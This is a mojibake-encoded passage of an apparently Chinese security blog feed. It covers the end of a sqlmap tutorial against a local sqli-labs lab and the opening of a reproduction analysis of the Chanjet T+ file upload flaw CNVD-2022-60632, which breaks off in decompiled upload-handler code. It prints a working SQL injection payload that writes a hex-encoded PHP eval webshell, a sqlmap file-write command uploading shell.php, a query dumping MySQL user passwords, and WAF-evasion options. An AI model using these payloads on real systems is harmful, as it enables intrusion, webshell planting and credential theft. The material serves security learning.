class="line">æŸ¥çœ‹æ•°æ®åº“æ˜¯å¦æœ‰å†™å…¥ã€å†™å‡ºã€æˆ–æŒ‡å®šå…·ä½“è·¯å¾„å†™å…¥å±æ€§ï¼Œç”¨æ¥é™åˆ¶å¯¼å‡ºæ•ˆæœã€‚ä»–æœ‰ä¸‰ä¸ªå±æ€§ï¼š</span><br><span class="line">1ï¼‰nullé™åˆ¶ä¸èƒ½å¯¼å‡º</span><br><span class="line">2ï¼‰ä¸ºç©ºå¯ä»¥è‡ªå®šä¹‰</span><br><span class="line">3ï¼‰ä¸ºä¸€ä¸ªè·¯å¾„åˆ™åªèƒ½å¯¼å‡ºåˆ°æŒ‡å®šè·¯å¾„</span><br><span class="line">è‹¥ä¸Šå›¾ä¸ºC:\\å³ä¸ºç©ºï¼Œå³å¯ä»¥è‡ªå®šä¹‰å†™å…¥è·¯å¾„</span><br><span class="line"></span><br><span class="line"># @@basedir</span><br><span class="line">è¯¥å‚æ•°æŒ‡å®šäº†å®‰è£… MySQL çš„å®‰è£…è·¯å¾„ï¼ˆmysqlå®‰è£…ç›®å½•ï¼‰</span><br><span class="line"></span><br><span class="line"># @@datadir å‚æ•°</span><br><span class="line">è¯¥å‚æ•°æŒ‡å®šMySQLçš„æ•°æ®æ–‡ä»¶çš„å­˜æ”¾ç›®å½•ï¼Œæ•°æ®åº“æ–‡ä»¶å³æˆ‘ä»¬å¸¸è¯´çš„ MySQL data æ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure></div><p>ä¸º NULL ä¸å¯å¯¼å‡ºï¼Œæ‰€ä»¥å¾—ä¿®æ”¹ä¸ºç©ºæ‰èƒ½é€šè¿‡ into file è¿›è¡Œå†™å…¥ï¼Œå®æˆ˜ä¸­è‹¥ä¸º NULL åˆ™ä¸èƒ½è¿›ä¸€æ­¥åˆ©ç”¨</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029180535990.png" data-caption="image-20221029180535990"><img src="/../images/sqlmap/image-20221029180535990.png" alt="image-20221029180535990"></a></p><p>åœ¨ Mysql æ–‡ä»¶ä¸­çš„ my.ini æ·»åŠ  <code>secure_file_priv=&quot;/&quot;</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029184518955.png" data-caption="image-20221029184518955"><img src="/../images/sqlmap/image-20221029184518955.png" alt="image-20221029184518955"></a></p><p>å†æ¬¡æ¢æµ‹ï¼Œ<code>@@secure_file_priv</code> å·²å˜ä¸º C:\</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029184439988.png" data-caption="image-20221029184439988"><img src="/../images/sqlmap/image-20221029184439988.png" alt="image-20221029184439988"></a></p><p>é€šè¿‡into outfile å†™å…¥ webshell, æ³¨å…¥ç‚¹é—­åˆè¯­å¥+å›æ˜¾ç‚¹+(ox+webshellåå…­è¿›åˆ¶)+â€ç½‘ç«™ç»å¯¹è·¯å¾„â€</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs-funsiooo.com:8001/Less-7/?id=1&#x27;)) union select 1,2,0x3c3f706870206576616c28245f504f53545b2774657374275d293f3e into outfile &quot;C:\\phpstudy_pro\\WWW\\www.sqli-labs-funsiooo.com\\Less-7\\1.php&quot; --+</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185203640.png" data-caption="image-20221029185203640"><img src="/../images/sqlmap/image-20221029185203640.png" alt="image-20221029185203640"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029213150700.png" data-caption="image-20221029213150700"><img src="/../images/sqlmap/image-20221029213150700.png" alt="image-20221029213150700"></a></p><p>æœªå†™å…¥å‰</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029184722537.png" data-caption="image-20221029184722537"><img src="/../images/sqlmap/image-20221029184722537.png" alt="image-20221029184722537"></a></p><p>å†™å…¥å</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185105234.png" data-caption="image-20221029185105234"><img src="/../images/sqlmap/image-20221029185105234.png" alt="image-20221029185105234"></a></p><p>é€šè¿‡èšå‰‘è¿›è¡Œè¿æ¥</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185419868.png" data-caption="image-20221029185419868"><img src="/../images/sqlmap/image-20221029185419868.png" alt="image-20221029185419868"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185554953.png" data-caption="image-20221029185554953"><img src="/../images/sqlmap/image-20221029185554953.png" alt="image-20221029185554953"></a></p><p>sql-shell ä¸­é€šè¿‡ä»¥ä¸‹è¿™æ¡å‘½ä»¤ï¼Œå¯ä»¥æŸ¥è¯¢æ•°æ®åº“çš„ç”¨æˆ·å’Œå¯†ç  <code>sql-shell&gt; select host,user,password from mysql.user</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185835833.png" data-caption="image-20221029185835833"><img src="/../images/sqlmap/image-20221029185835833.png" alt="image-20221029185835833"></a></p><h4 id="file-read"><a href="#file-read" class="headerlink" title="file-read"></a>file-read</h4><p>å½“æ•°æ®åº“ä¸º MySQLã€PostgreSQL æˆ– SQL Serverï¼Œå¹¶ä¸”å½“å‰ç”¨æˆ·æœ‰æƒé™æ—¶ï¼Œå¯ä»¥è¯»å–æŒ‡å®šæ–‡ä»¶ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029223918619.png" data-caption="image-20221029223918619"><img src="/../images/sqlmap/image-20221029223918619.png" alt="image-20221029223918619"></a></p><p>æ‰§è¡Œå‘½ä»¤ <code>python sqlmap.py -u &quot;http://www.sqli-labs-funsiooo.com:8001/Less-5/?id=1&quot; --file-read &quot;C:\Users\Public\test.txt&quot;</code> æˆåŠŸè¯»å–ï¼Œå¹¶å°†æ–‡ä»¶ä¿å­˜åœ¨ç”µè„‘ <code>C:\Users\Boom\AppData\Local\sqlmap\output\www.sqli-labs-funsiooo.com\files</code> ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029224405312.png" data-caption="image-20221029224405312"><img src="/../images/sqlmap/image-20221029224405312.png" alt="image-20221029224405312"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029224443986.png" data-caption="image-20221029224443986"><img src="/../images/sqlmap/image-20221029224443986.png" alt="image-20221029224443986"></a></p><h4 id="file-writeã€file-dest"><a href="#file-writeã€file-dest" class="headerlink" title="file-writeã€file-dest"></a>file-writeã€file-dest</h4><p>å½“æ•°æ®åº“ä¸ºMySQLã€Postgre SQLæˆ–è€…Sql Server(é€šè¿‡powershellå†™å…¥)ï¼Œå¹¶ä¸”å½“å‰ç”¨æˆ·æœ‰æƒé™å‘ä»»æ„ç›®å½•å†™æ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶åˆ°æ•°æ®åº“æœåŠ¡å™¨ã€‚æˆ‘ä»¬å¯ä»¥ä¸Šä¼ æœ¨é©¬è¿›è¡Œ getshell</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://www.sqli-labs-funsiooo.com:8001/Less-5/?id=1&quot; --file-write C:\Users\Boom\Desktop\sql_upload\shell.php --file-dest &quot;C:\phpstudy_pro\WWW\www.sqli-labs-funsiooo.com\shell-2.php&quot;</span><br></pre></td></tr></table></figure></div><p>æˆåŠŸä¸Šä¼ </p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232542537.png" data-caption="image-20221029232542537"><img src="/../images/sqlmap/image-20221029232542537.png" alt="image-20221029232542537"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232506161.png" data-caption="image-20221029232506161"><img src="/../images/sqlmap/image-20221029232506161.png" alt="image-20221029232506161"></a></p><p>ä¸ºä¸Šä¼ å‰</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232153105.png" data-caption="image-20221029232153105"><img src="/../images/sqlmap/image-20221029232153105.png" alt="image-20221029232153105"></a></p><p>ä¸Šä¼ å</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232659447.png" data-caption="image-20221029232659447"><img src="/../images/sqlmap/image-20221029232659447.png" alt="image-20221029232659447"></a></p><p>è¿æ¥ Webshellï¼Œè¿™é‡Œä½¿ç”¨å†°è4 è™½ç„¶ä¸Šä¼ æˆåŠŸä½†è¿æ¥ä¸æˆåŠŸï¼Œä»¥ä¸‹æ¢å›å†°è3æ‰èƒ½æˆåŠŸè¿æ¥</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232331747.png" data-caption="image-20221029232331747"><img src="/../images/sqlmap/image-20221029232331747.png" alt="image-20221029232331747"></a></p><h3 id="å®šåˆ¶åŒ–å‚æ•°"><a href="#å®šåˆ¶åŒ–å‚æ•°" class="headerlink" title="å®šåˆ¶åŒ–å‚æ•°"></a>å®šåˆ¶åŒ–å‚æ•°</h3><p>æœ‰æ—¶å€™é€šè¿‡æµ‹è¯•å‘ç°å­˜åœ¨ sql æ³¨å…¥ï¼Œä½†åˆ©ç”¨ sqlmap è¿›è¡ŒéªŒè¯æ—¶å‘ç°å´ä¸èƒ½æ£€æµ‹å‡ºæ¥å­˜åœ¨æ³¨å…¥ï¼Œè¿™æ—¶å€™å°±éœ€è¦æ ¹æ®å®é™…æƒ…å†µå¯¹ sqlmap è¯·æ±‚å‚æ•°è¿›è¡Œå¤„ç†</p><p>æŠ“å–æ•°æ®åŒ…ï¼Œå°† Request è¯·æ±‚å¤åˆ¶ä¿å­˜ä¸º .txt æ–‡ä»¶ï¼Œæ”¾ç½®åˆ° sqlmap ç›®å½•ä¸‹ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029221914451.png" data-caption="image-20221029221914451"><img src="/../images/sqlmap/image-20221029221914451.png" alt="image-20221029221914451"></a></p><p>ç›´æ¥å¯¹æ•°æ®åŒ…è¿›è¡ŒéªŒè¯ï¼Œsqlmap æ²¡æœ‰å‘ç°æ¼æ´</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029222203157.png" data-caption="image-20221029222203157"><img src="/../images/sqlmap/image-20221029222203157.png" alt="image-20221029222203157"></a></p><p>æˆ‘ä»¬å°†æ¢æµ‹ç­‰çº§æå‡è‡³ â€“level 3 ï¼Œå†æ¬¡è¿›è¡Œæµ‹è¯•ï¼Œsqlmap å¯å‘ç°æ¼æ´çš„å­˜åœ¨</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029222231713.png" data-caption="image-20221029222231713"><img src="/../images/sqlmap/image-20221029222231713.png" alt="image-20221029222231713"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029222252599.png" data-caption="image-20221029222252599"><img src="/../images/sqlmap/image-20221029222252599.png" alt="image-20221029222252599"></a></p><p>è¿™åªæ˜¯ä¸€ä¸ªå°ä¾‹å­ï¼Œæˆ‘ä»¬å®æˆ˜ä¸­å¯èƒ½å¯¹å­˜åœ¨ WAF æˆ–å…¶é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€æ­¥æ­¥è°ƒè¯• sqlmap å‚æ•°è¿›è¡Œæµ‹è¯•ï¼Œæ¯”å¦‚æˆ‘ä»¬ä¸ºäº†é€ƒé¿ç³»ç»Ÿçš„æ£€æµ‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ â€“random-agent å˜æ¢ User-Agent å¤´ï¼Œâ€“technique æŒ‡å®šæ³¨å…¥ç±»å‹ï¼Œ â€“tamper æŒ‡å®šè„šæœ¬ç­‰ç­‰æŒ‡ä»¤è¿›è¡Œè°ƒè¯•ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ -v å‚æ•°æŸ¥çœ‹ sqlmap çš„æµ‹è¯• payload æœºåˆ¶ï¼Œç ”ç©¶å…¶ payload çš„ç»„æˆï¼Œæ­é…temper èƒ½æ›´å¥½çš„åˆ†æå…¶ bypass æœºåˆ¶ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029223129493.png" data-caption="image-20221029223129493"><img src="/../images/sqlmap/image-20221029223129493.png" alt="image-20221029223129493"></a></p><p>æœ¬äººå¸¸ç”¨å‘½ä»¤ <code>sqlmap.py -r data.txt --levle 3 -p username --dbs --tamper space2morecomment --random-agent --ignore-redirects --ignore-proxy --technique=B</code></p><h2 id="å…­ã€æ€»ç»“"><a href="#å…­ã€æ€»ç»“" class="headerlink" title="å…­ã€æ€»ç»“"></a>å…­ã€æ€»ç»“</h2><p>é€šè¿‡æ¡ˆä¾‹å­¦ä¹  sqlmap çš„åŸºæœ¬ä½¿ç”¨ï¼Œæœ€å¤§ç¨‹åº¦è‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œå·¥å…·åªæ˜¯è¾…åŠ©ï¼Œå¯¹äº SQL æ³¨å…¥è¿™é‡Œç±»å‹ï¼Œè¿˜æ˜¯å¾—æ‰“å¥½åŸºç¡€ï¼Œç†è§£å…¶åŸç†ï¼Œæœ¬äººä¹Ÿä¸€ç›´åœ¨æŒç»­å­¦ä¹ ä¸­ï¼ŒæŠŠå®ƒç ”ç©¶é€è¿˜æ˜¯å¾—éœ€è¦ç‚¹æ—¶é—´ã€‚å½“ç„¶ sqlmap ä½œä¸ºæˆç†Ÿçš„è‡ªåŠ¨åŒ–å·¥å…·ï¼Œå…¶åŠŸèƒ½ä¸æ­¢ä»¥ä¸Šæ‰€é˜è¿°çš„è¿™ä¹ˆå°‘ï¼Œå…¶ä½™åŠŸèƒ½æœ‰å¾…æŒ–æ˜ã€‚</p><h2 id="ä¸ƒã€å‚è€ƒ"><a href="#ä¸ƒã€å‚è€ƒ" class="headerlink" title="ä¸ƒã€å‚è€ƒ"></a>ä¸ƒã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.yang99.top/index.php/archives/30/</span><br><span class="line">https://www.anquanke.com/post/id/235846</span><br><span class="line">https://blog.yd0ng.com/2020/09/07/SQLMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E5%8F%8Atamper%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/</span><br><span class="line">https://www.cnblogs.com/fzblog/p/13800604.html</span><br><span class="line">https://sqlmap.kvko.live/usage</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·ä½¿ç”¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç•…æ·é€šä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´å¤ç°åˆ†æè¿‡ç¨‹ CNVD-2022-60632</title>
      <link href="/2022/10/26/%E7%95%85%E6%8D%B7%E9%80%9A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B-CNVD-2022-60632/"/>
      <url>/2022/10/26/%E7%95%85%E6%8D%B7%E9%80%9A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B-CNVD-2022-60632/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>å€¼å®ˆæœŸé—´çœ‹åˆ°ç½‘ä¸Šå¸ˆå‚…çš„æ–‡ç« ï¼Œäºæ˜¯å°±æœ‰ä»¥ä¸‹è¿™ç¯‡æ–‡ç« ã€‚æ¼æ´å½±å“ç‰ˆæœ¬ï¼šç•…æ·é€šT+å•æœºç‰ˆ&lt;&#x3D;17.0ä¸”ä½¿ç”¨IIS10.0ä»¥ä¸‹ç‰ˆæœ¬ï¼Œæ¼æ´ç‚¹ <code>tplus/SM/SetupAccount/Upload.aspx?preload=1</code>ã€‚</p><h2 id="äºŒã€ç¯å¢ƒæ­å»º"><a href="#äºŒã€ç¯å¢ƒæ­å»º" class="headerlink" title="äºŒã€ç¯å¢ƒæ­å»º"></a>äºŒã€ç¯å¢ƒæ­å»º</h2><p>1ã€é€‰æ‹©ä¸‹è½½å®‰è£…ï¼Œ<a href="https://dad.chanapp.chanjet.com/TplusYZHJ17.0.zip">https://dad.chanapp.chanjet.com/TplusYZHJ17.0.zip</a> è¿™è¾¹é€‰æ‹©è¿…é›·ä¸‹è½½ï¼Œè§£å‹åé€‰æ‹©æ ‡å‡†ç‰ˆå®‰è£…ï¼Œè®°å¾—æŒ‰ç…§æç¤ºå…ˆå…³é—­æ€æ¯’è½¯ä»¶ï¼Œå®‰è£…è¿‡ç¨‹æ¯”è¾ƒæ…¢ï¼Œéœ€è¦ç­‰å¾…ä¸€æ®µæ—¶é—´ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024024825548.png" data-caption="image-20221024024825548"><img src="/../images/chanjet/image-20221024024825548.png" alt="image-20221024024825548"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024025122968.png" data-caption="image-20221024025122968"><img src="/../images/chanjet/image-20221024025122968.png" alt="image-20221024025122968"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024025141554.png" data-caption="image-20221024025141554"><img src="/../images/chanjet/image-20221024025141554.png" alt="image-20221024025141554"></a></p><p>å®‰è£…è¿‡ç¨‹ä¸­æç¤ºè®¾ç½®æ•°æ®åº“ï¼Œè¿™é‡Œé€‰æ‹©å…³é—­ï¼Œä¸è¿›è¡Œæ•°æ®åº“é…ç½®</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024025910710.png" data-caption="image-20221024025910710"><img src="/../images/chanjet/image-20221024025910710.png" alt="image-20221024025910710"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024025941436.png" data-caption="image-20221024025941436"><img src="/../images/chanjet/image-20221024025941436.png" alt="image-20221024025941436"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024030340481.png" data-caption="image-20221024030340481"><img src="/../images/chanjet/image-20221024030340481.png" alt="image-20221024030340481"></a></p><p>å®‰è£…å®Œæˆåï¼Œç‚¹å‡»æ¡Œé¢å›¾æ ‡å³å¯è¿›å…¥è®¿é—®</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024030529327.png" data-caption="image-20221024030529327"><img src="/../images/chanjet/image-20221024030529327.png" alt="image-20221024030529327"></a></p><h2 id="ä¸‰ã€æ¼æ´åˆ†æ"><a href="#ä¸‰ã€æ¼æ´åˆ†æ" class="headerlink" title="ä¸‰ã€æ¼æ´åˆ†æ"></a>ä¸‰ã€æ¼æ´åˆ†æ</h2><h3 id="å®šä½æ¼æ´ç‚¹"><a href="#å®šä½æ¼æ´ç‚¹" class="headerlink" title="å®šä½æ¼æ´ç‚¹"></a>å®šä½æ¼æ´ç‚¹</h3><p>åœ¨è·¯å¾„ <code>C:\Program Files (x86)\Chanjet\TPlusStd</code> æ‰¾åˆ°å®‰è£…åçš„æºç </p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024031412457.png" data-caption="image-20221024031412457"><img src="/../images/chanjet/image-20221024031412457.png" alt="image-20221024031412457"></a></p><p>æ ¹æ®ç½‘ä¸Š Payload å®šä½æ¼æ´ç‚¹ <code>tplus/SM/SetupAccount/Upload.aspx?preload=1</code>ï¼Œç³»ç»Ÿé‡‡ç”¨äº†é¢„ç¼–è¯‘ï¼ˆæ³¨ï¼šé¢„ç¼–è¯‘å³åœ¨å®‰è£…æ—¶ç³»ç»Ÿè¿›è¡Œäº†é¢„ç¼–è¯‘å¤„ç†ï¼Œå³ç³»ç»Ÿåœ¨ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®å‰å·²è¿›è¡Œé¢„å…ˆç¼–è¯‘ï¼Œå½“ç”¨æˆ·è®¿é—®æ—¶ä¸è¦å†æ¬¡è¿›è¡Œç¼–è¯‘ï¼Œä½¿ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®æ—¶çš„å“åº”é€Ÿåº¦æ›´å¿«ï¼Œä¹Ÿä¿æŠ¤äº†æºä»£ç çš„å®‰å…¨ï¼Œä¸€å®šç¨‹åº¦ä¸Šé¿å…äº†æºç æ³„éœ²é€ æˆçš„é£é™©ï¼Œä½†ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œè‹¥éœ€è¦è¿›è¡Œä¿®æ”¹åˆ™æ•´ä¸ªç¨‹åºéœ€è¦é‡æ–°ç¼–è¯‘å‘è¡Œï¼‰</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024031827118.png" data-caption="image-20221024031827118"><img src="/../images/chanjet/image-20221024031827118.png" alt="image-20221024031827118"></a></p><p>ç»è¿‡æµè§ˆæºç å‘ç°ï¼Œæˆå¥—ç¨‹åºéƒ½è¿›è¡Œäº†é¢„ç¼–è¯‘å¤„ç†ï¼Œæ— æ³•æŸ¥çœ‹å…¶æºä»£ç ï¼ˆå½“ ASP.NET éƒ¨ç½²äº†é¢„ç¼–è¯‘çš„åº”ç”¨ç¨‹åºåï¼Œä¼šè°ƒç”¨ Bin æ–‡ä»¶å¤¹ä¸­çš„ç¨‹åºé›†æ¥è¿›è¡Œå¤„ç†è¯·æ±‚ï¼Œå…¶ä¸­ç¼–è¾‘å™¨ç¨‹åºé›†å’Œæ–‡ä»¶æ‰©å±•åä¸º .compiledï¼Œç¨‹åºé›†åç§°ç”±ç¼–è¯‘å™¨ç”Ÿæˆï¼Œ .compiled æ–‡ä»¶å†…å®¹ä¸åŒ…å«å¯æ‰§è¡Œä»£ç ï¼ŒåªåŒ…å« ASP.NET æŸ¥æ‰¾ç›¸åº”çš„ç¨‹åºé›†æ‰€éœ€çš„ä¿¡æ¯ã€‚é¢„ç¼–è¯‘æ–‡ä»¶åªæ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œè‹¥éœ€è¦æ‰¾åˆ°æºç åˆ™å¯èƒ½éœ€è¦åç¼–è¯‘ .dll æ–‡ä»¶ã€‚ï¼‰</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024032632804.png" data-caption="image-20221024032632804"><img src="/../images/chanjet/image-20221024032632804.png" alt="image-20221024032632804"></a></p><p>æˆ‘ä»¬æ‰¾åˆ°æ¼æ´ç‚¹æ–‡ä»¶ç›¸å¯¹åº”å¯¹çš„ .compiled æ–‡ä»¶ï¼Œé€šè¿‡æŸ¥æ‰¾å¯¹æ¯”ï¼Œæ‰¾åˆ°å¯¹åº”çš„ .compiled æ–‡ä»¶ï¼š<code>bin/upload.aspx.9475d17f.compiled</code></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024034159504.png" data-caption="image-20221024034159504"><img src="/../images/chanjet/image-20221024034159504.png" alt="image-20221024034159504"></a></p><p>æ ¹æ® upload.aspx å¯¹åº”çš„ .compiled æ–‡ä»¶å®šä½åˆ°ç¨‹åºé›†æ–‡ä»¶ App_Web_upload.aspx.9475d17f</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">preserve</span> <span class="attr">resultType</span>=<span class="string">&quot;3&quot;</span> <span class="attr">virtualPath</span>=<span class="string">&quot;/WebSite/SM/SetupAccount/Upload.aspx&quot;</span> <span class="attr">hash</span>=<span class="string">&quot;16f32931f&quot;</span> <span class="attr">filehash</span>=<span class="string">&quot;8aff27fcb5b4a92d&quot;</span> <span class="attr">flags</span>=<span class="string">&quot;110000&quot;</span> <span class="attr">assembly</span>=<span class="string">&quot;App_Web_upload.aspx.9475d17f&quot;</span> <span class="attr">type</span>=<span class="string">&quot;ASP.sm_setupaccount_upload_aspx&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filedeps</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filedep</span> <span class="attr">name</span>=<span class="string">&quot;/WebSite/SM/SetupAccount/Upload.aspx&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filedep</span> <span class="attr">name</span>=<span class="string">&quot;/WebSite/SM/SetupAccount/Upload.aspx.cs&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filedeps</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">preserve</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024035613099.png" data-caption="image-20221024035613099"><img src="/../images/chanjet/image-20221024035613099.png" alt="image-20221024035613099"></a></p><h3 id="dllåç¼–è¯‘åˆ†æ"><a href="#dllåç¼–è¯‘åˆ†æ" class="headerlink" title="dllåç¼–è¯‘åˆ†æ"></a>dllåç¼–è¯‘åˆ†æ</h3><p>ä½¿ç”¨ dnSpy å¯¹ <code>App_Web_upload.aspx.9475d17f</code> è¿›è¡Œè°ƒè¯•ï¼ˆæ³¨ï¼šdnSpy æ˜¯ä¸€ä¸ªè°ƒè¯•å™¨å’Œ .NET ç¨‹åºé›†ç¼–è¾‘å™¨ã€‚å³ä½¿æ‚¨æ²¡æœ‰ä»»ä½•å¯ç”¨çš„æºä»£ç ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨å®ƒæ¥ç¼–è¾‘å’Œè°ƒè¯•ç¨‹åºé›†,åœ¨çº¿é€†å‘ï¼‰ï¼Œé¡¹ç›®åœ°å€ <code>https://github.com/dnSpy/dnSpy</code>ï¼Œè¿™é‡Œç›´æ¥æœç´¢ <code>App_Web_upload.aspx.9475d17f</code> æ‹‰è¿› dnSpy å³å¯</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024040132466.png" data-caption="image-20221024040132466"><img src="/../images/chanjet/image-20221024040132466.png" alt="image-20221024040132466"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024040248526.png" data-caption="image-20221024040248526"><img src="/../images/chanjet/image-20221024040248526.png" alt="image-20221024040248526"></a></p><p>é€šè¿‡åˆ†æå®šä½åˆ°æ¼æ´é¡µé¢æºç </p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024040625235.png" data-caption="image-20221024040625235"><img src="/../images/chanjet/image-20221024040625235.png" alt="image-20221024040625235"></a></p><p>æºç å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// CommonPage_SetupAccount_Upload</span><br><span class="line">// Token: 0x06000004 RID: 4 RVA: 0x000020AC File Offset: 0x000002AC</span><br><span class="line">protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">this.ReadResources();</span><br><span class="line">if (base.Request.Files.Count == 1)</span><br><span class="line">&#123;</span><br><span class="line">string text = &quot;images/index.gif&quot;;</span><br><span class="line">object obj = this.ViewState[&quot;fileName&quot;];</span><br><span class="line">if (obj != null)</span><br><span class="line">&#123;</span><br><span class="line">text = obj.ToString();</span><br><span class="line">&#125;</span><br><span class="line">if (this.File1.PostedFile.ContentLength &gt; 204800)</span><br><span class="line">&#123;</span><br><span class="line">base.Response.Write(string.Concat(new string[]</span><br><span class="line">&#123;</span><br><span class="line">&quot;&lt;script 